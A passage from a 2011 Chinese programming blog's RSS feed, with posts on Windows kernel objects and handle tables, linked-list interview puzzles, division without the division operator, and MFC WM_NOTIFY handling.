&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sat, 03 Sep 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-09-03:blog/2011/09/03/windowshe-xin-bian-cheng-du-shu-bi-ji-2-jin-cheng-zuo-ye-xian-cheng/</guid><category>windows</category><category>programming</category></item><item><title>《Windows核心编程》读书笔记1--内核对象</title><link>http://www.goorockey.com/blog/2011/09/02/windowshe-xin-bian-cheng-du-shu-bi-ji-1-nei-he-dui-xiang/</link><description>
&lt;h2 id="_1"&gt; 一、摘要 &lt;/h2&gt;
&lt;p&gt;1. 内核对象有使用计数，当计数减为 0 时，内核对象被销毁。&lt;/p&gt;
&lt;p&gt;2. 内核对象有安全描述符，控制该进程能做的操作。&lt;/p&gt;
&lt;p&gt;3. 每个进程内有内核对象句柄表，记录使用中的内核对象。&lt;/p&gt;
&lt;h2 id="_2"&gt; 二、内核对象 &lt;/h2&gt;
&lt;p&gt;1. 对内核对象的操作 , 只能通过调 API&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 应用程序无法在内存中找到表示内核对象的数据结构 , 也就无法直接修改其状态。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 要对内核对象操作，只能先获得其句柄，然后调用 window 定义好的 API&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!--more--&gt;
&lt;p&gt;2. 内核对象的使用计数，记录在使用它的进程数 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 内核对象是属于内核的，而不属于任何一个进程，包括创建它的哪个进程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 内核对象中有一个使用计数的数据，记录在使用它的进程数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 只有当使用计数为零时，该内核对象才会被销毁。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 即使创建它的进程终止了，该内核对象的使用计数不为零就不会被销毁。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3. 内核对象的安全描述符，控制进程对其的使用权 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 在创建内核对象的 API 中，都有一个 “ 安全描述符 ” 的参数，是用来控制对这个内核对象的使用权的
例如创建文件内存映射 CreateFileMapping 就有一个 PSECURITY_ATTRIBUTES 的参数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 而在获取该内核对象的 API OpenFileMapping 中，会有一个表征获取该对象做什么操作的参数。
如果该用户允许对该内核对象做该操作，则成功返回该内核对象句柄，否则返回 NULL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 分辨一个对象是否为内核对象的标志是，创建该对象的 API 是否有 “ 安全描述符 ” 这个参数。
如创建 GDI 就没有该参数，所以 GDI 不是内核对象 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4. 进程的内核对象句柄表，记录使用的内核对象 &lt;/p&gt;
&lt;p&gt; 内核对象句柄表结构：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; 索引 (Handle)&lt;/th&gt;
&lt;th&gt; 内核对象内存块的指针 &lt;/th&gt;
&lt;th&gt; 访问屏蔽（标志位的 DWORD）&lt;/th&gt;
&lt;th&gt; 继承标志（标志位的 DWORD ）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0 x ? ? ? ? ? ? ? ?&lt;/td&gt;
&lt;td&gt;0 x ? ? ? ? ? ? ? ?&lt;/td&gt;
&lt;td&gt;0 x ? ? ? ? ? ? ? ?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;0 x ? ? ? ? ? ? ? ?&lt;/td&gt;
&lt;td&gt;0 x ? ? ? ? ? ? ? ?&lt;/td&gt;
&lt;td&gt;0 x ? ? ? ? ? ? ? ?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;…&lt;/td&gt;
&lt;td&gt;…&lt;/td&gt;
&lt;td&gt;…&lt;/td&gt;
&lt;td&gt;…&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 每个进程内都有一个内核对象句柄表来记录它在使用的内核对象，表中包含该内核对象内存块的指针。
在内核对象的句柄就是该内核对象在此表中的索引值。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 创建内核对象时，会在表中寻找空白项，并添加新项，并通过该内核对象指针对它的使用计数置 1.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 用 CloseHandle 释放进程对该内核对象使用权时，就通过该指针对使用计数减 1&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 即使没有用 CloseHandle，当进程终止时，会对句柄表中没有释放使用权的内核对象计数减 1&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5. 进程间访问内核对象 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 设置子进程继承父进程的内核对象 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 创建有名字的内核对象，并通过内核对象名字访问它。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DuplicateHandle 复制内核对象 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;6. 当用 Create*（如 CreateMutex）创建有名字的内核对象 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 如果 &lt;strong&gt; 同名字 &lt;/strong&gt;、&lt;strong&gt; 同类 &lt;/strong&gt; 的内核对象已存在，则返回该内核对象的 Handle；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 如果 &lt;strong&gt; 同名字 &lt;/strong&gt;、&lt;strong&gt; 不同类 &lt;/strong&gt; 的内核对象已存在，则创建失败，并返回 NULL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 如果没有同名字的内核对象存在，则创建新内核对象 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Fri, 02 Sep 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-09-02:blog/2011/09/02/windowshe-xin-bian-cheng-du-shu-bi-ji-1-nei-he-dui-xiang/</guid><category>windows</category><category>programming</category></item><item><title>面试趣题</title><link>http://www.goorockey.com/blog/2011/08/24/mian-shi-qu-ti/</link><description>
&lt;h3 id="_1"&gt; 题一、有一个整数数组，请求出两两之差绝对值最小的值 &lt;/h3&gt;
&lt;p&gt; 方法：先排序，再找差值最小的点对。&lt;/p&gt;
&lt;p&gt; 效率：时间复杂度 O(nlogn)&lt;/p&gt;
&lt;h3 id="n"&gt; 题二、平面上 N 个点，每两个点都确定一条直线，求出斜率最大的那条直线所通过的两个点（斜率不存在的情况不考虑）&lt;/h3&gt;
&lt;p&gt; 方法：根据 x 排序，用图解枚举所有情况，能证明斜率最大的两点肯定是相邻的两点。&lt;/p&gt;
&lt;p&gt; 效率：时间复杂度 O(nlogn)&lt;/p&gt;
&lt;h3 id="f2ff"&gt; 题三、一棵排序二叉树，令 f=( 最大值 + 最小值 )/2，设计一个算法，找出距离 f 值最近、大于 f 值的结点 &lt;/h3&gt;
&lt;p&gt; 方法：把 f 插入，中序排序 &lt;/p&gt;
&lt;p&gt; 效率：时间复杂度 O(logn)&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id="_2"&gt; 题四、找出两个字符串中最大公共子字符串 &lt;/h3&gt;
&lt;p&gt; 如 "abccade","dgcadde" 的最大子串为 "cad"&lt;/p&gt;
&lt;p&gt;&lt;em&gt; 方法一：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt; 从字符串一中遍历子串，并在字符串二中匹配。时间复杂度为 O(n^3)。&lt;/p&gt;
&lt;p&gt;&lt;em&gt; 方法二：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt; 矩阵法：用矩阵表示两字符串，横竖字符相同的格置 1，则在 45 度方向连续 1 最多的就是所求，时间复杂度 O(n^2) 。&lt;/p&gt;
&lt;h3 id="_3"&gt; 题五、检查单向链表中是否有环 &lt;/h3&gt;
&lt;p&gt; 这算是经典的面试题了，记录一下好的解法和推广。&lt;/p&gt;
&lt;p&gt;&lt;em&gt; 方法一：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt; 操作：把链表反向，当游标指针回到首节点时表示有环，否则无环。&lt;/p&gt;
&lt;p&gt; 解释：如果有环，把链表反向后，游标指针会从环内回到环外，最后回到首节点。&lt;/p&gt;
&lt;p&gt; 效率：时间复杂度 O(n)，空间复杂度 O(1)。&lt;/p&gt;
&lt;p&gt; 不足：破坏原链表的结构，需要再遍历一次链表来恢复链表结构。&lt;/p&gt;
&lt;p&gt;&lt;em&gt; 方法二 :&lt;/em&gt;&lt;/p&gt;
&lt;p&gt; 操作：&lt;/p&gt;
&lt;p&gt; 两个游标指针 , 一个慢指针每次移动一个节点，一个快指针每次移动两个节点。如果在快指针遍历到链表结尾前遇到慢指针，则链表有环，否则无环。&lt;/p&gt;
&lt;p&gt; 解释：&lt;/p&gt;
&lt;p&gt; 如果有环，当慢指针刚进入环时，设快指针与慢指针的距离为 n（距离指慢指针不动是，快指针要经过几次节点达到慢指针），由于快指针每次都追上慢指针一个节点，则两者经过 n 次后总会相遇。&lt;/p&gt;
&lt;p&gt; 效率：时间复杂度 O(n)， 空间复杂度 O(1)。&lt;/p&gt;
&lt;p&gt;&lt;script src="https://gist.github.com/goorockey/3712175.js"&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id="_4"&gt; 推广一：有环单向链表中环的节点数 &lt;/h3&gt;
&lt;p&gt; 操作：&lt;/p&gt;
&lt;p&gt; 还是用快慢指针，当快慢指针在环内相遇后，两指针继续移动，并对慢指针移动的节点计数。当两指针再次相遇时，计数的结果就是环的节点数。&lt;/p&gt;
&lt;p&gt; 解释：&lt;/p&gt;
&lt;p&gt; 还是题一中的思想。设环的节点数为 n，当两指针第一次相遇时，可看做两指针的距离为 n，则再慢指针再经过 n 个节点后，两指针会再次相遇，所以慢指针移动的节点数就是环的节点数。&lt;/p&gt;
&lt;p&gt;&lt;script src="https://gist.github.com/goorockey/3712217.js"&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id="_5"&gt; 推广二、找到有环单向链表中环首节点 &lt;/h3&gt;
&lt;p&gt; 如以下有环单向链表：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 即第 9 节点的 next 指针指向第 4 节点，则环的首节点为第 4 节点 &lt;/p&gt;
&lt;p&gt; 操作：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt; 先计算环的节点数 &lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;。&lt;/span&gt;
&lt;span class="err"&gt; 两个前后指针，前指针先移动 &lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt; 个节点，然后两指针一齐移动，每次都只移动一个的节点。&lt;/span&gt;
&lt;span class="err"&gt; 当两指针相遇时，两指针指向的节点就是所求的环首节点。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 解释：因为开始两指针相距 n 个节点，当后指针刚进入环时，肯定会与前指针在环的首节点相遇。&lt;/p&gt;
&lt;h3 id="_6"&gt; 推广三、破坏有环单向链表的环 &lt;/h3&gt;
&lt;p&gt; 操作：&lt;/p&gt;
&lt;p&gt; 在上面的基础上，当找到了环首节点和环内节点数 n 后，只要从环首节点移动 n 到达环的尾节点，修改环尾节点的 next 指针即可。&lt;/p&gt;
&lt;p&gt;&lt;script src="https://gist.github.com/goorockey/3712226.js"&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id="_7"&gt; 题五、找到有序链表的中位值 &lt;/h3&gt;
&lt;p&gt; 常规方法：遍历一次链表得到链表长度 length，再遍历一次链表到 length/2 的位置即为中位值 &lt;/p&gt;
&lt;p&gt; 更好的方法：用两个指针 p1、p2，p1 每次走两步，p2 每次走一步，等到 p1 到链表尾时，p2 所指即为中位值 &lt;/p&gt;
&lt;p&gt;&lt;script src="https://gist.github.com/goorockey/3824662.js"&gt;&lt;/script&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Wed, 24 Aug 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-08-24:blog/2011/08/24/mian-shi-qu-ti/</guid><category>programming</category><category>面试</category></item><item><title>不用除法运算符实现除法及其推广</title><link>http://www.goorockey.com/blog/2011/08/22/bu-yong-chu-fa-yun-suan-fu-shi-xian-chu-fa-ji-qi-tui-yan/</link><description>
&lt;p&gt; 两个正整数 x、y，x 是 y 的倍数，不用除法运算符实现 x / y。&lt;/p&gt;
&lt;p&gt;1、最简单的方法 &lt;/p&gt;
&lt;p&gt; 循环用 x 减 y，知道 x 等于 0。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;Div&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 时间复杂度 &lt;code&gt;O(n)&lt;/code&gt;&lt;/p&gt;
&lt;!--more--&gt;
&lt;p&gt;2、用移位实现 &lt;/p&gt;
&lt;p&gt; 与很多优化算法相似，用 2 次幂实现加速。&lt;/p&gt;
&lt;p&gt; 考虑到 x 是 y 的倍数，设 x = y * k&lt;/p&gt;
&lt;p&gt; 因为我们可以用二进制表示任意整数，所以任意整数都可表示成 2 次幂的和，即：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;t1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;t2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;tn&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 所以有 x = y * (2^t1 + 2^t2 + … + 2^tn)，即我们要的结果就是 2^t1 + 2^t2 + … + 2^tn&lt;/p&gt;
&lt;p&gt; 由此，我们可以先找到一个刚好不大于 x 的 s1 = y*(2^t1)，即有 &lt;code&gt;y*2^t1 &amp;lt;= x &amp;lt; y*2^(t1+1)&lt;/code&gt;,&lt;/p&gt;
&lt;p&gt; 然后令 x2 = x - s1 = y * (2^t2 + … + 2^tn)，从而继续递归直到 xn – sn = 0。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;Div&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;          &lt;span class="c1"&gt;// 2 次幂计数器 &lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;    &lt;span class="c1"&gt;// 中间乘积，等于 y*2^t，即 product = y * i&lt;/span&gt;

    &lt;span class="c1"&gt;// 找到刚好不大于 x 的 product = y*i 满足 y*i &amp;lt;= x &amp;lt; y*(i+1)&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt;  &lt;span class="o"&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="c1"&gt;// 递归得到结果 &lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// product 自除 2 来寻找新的 product，满足刚好不大于 x&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;     &lt;span class="c1"&gt;// 累加结果 result = 2^t1 + 2^t2 … + 2^t(k-1)&lt;/span&gt;
            &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;    &lt;span class="c1"&gt;// 相减得到新的 x = y*(2^tk + … + 2^tn)&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 时间复杂度 &lt;code&gt;O(logn)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3、推广 - 不用开方运算符求幂数：&lt;/p&gt;
&lt;p&gt; 两个正整数 x、y，不用开方运算符求 x 是 y 的几次幂。&lt;/p&gt;
&lt;p&gt; 思想与方法二类似。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include "math.h"&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;Extract&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;power&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;power&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;power&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;power&lt;/span&gt; &lt;span class="o"&gt;*=&lt;/span&gt; &lt;span class="n"&gt;power&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;power&lt;/span&gt; &lt;span class="o"&gt;/=&lt;/span&gt; &lt;span class="n"&gt;pow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;power&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt;
             &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;/=&lt;/span&gt; &lt;span class="n"&gt;power&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
             &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 时间复杂度 &lt;code&gt;O(logn)&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Mon, 22 Aug 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-08-22:blog/2011/08/22/bu-yong-chu-fa-yun-suan-fu-shi-xian-chu-fa-ji-qi-tui-yan/</guid><category>programming</category></item><item><title>VC中对WM_NOTIFY的处理</title><link>http://www.goorockey.com/blog/2011/08/19/vczhong-dui-wm_notifyde-chu-li/</link><description>
&lt;p&gt;1.Reflect&lt;/p&gt;
&lt;p&gt; 对于 WM_NOTIFY 消息：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; 子控件没有 Reflect，则由父窗口处理。
只要子控件（即消息对应最直接的控件）有了 ON_NOTIFY_REFLECT 就会被子控件处理 , 不会被父窗口所处理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Reflect 的意思就是把消息反射给子控件处理。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt; 大概的就是这样：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; 子控件有 ON_NOTIFY_REFLECT&lt;/th&gt;
&lt;th&gt; 父窗口有 ON_NOTIFY&lt;/th&gt;
&lt;th&gt; 效果 &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;WM_NOTIFY 未被处理 &lt;/td&gt;
&lt;td&gt;WM_NOTIFY 只被父窗口处理 &lt;/td&gt;
&lt;td&gt;WM_NOTIFY 只被子控件处理 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Y&lt;/td&gt;
&lt;td&gt;Y&lt;/td&gt;
&lt;td&gt;WM_NOTIFY 只被子控件处理 &lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
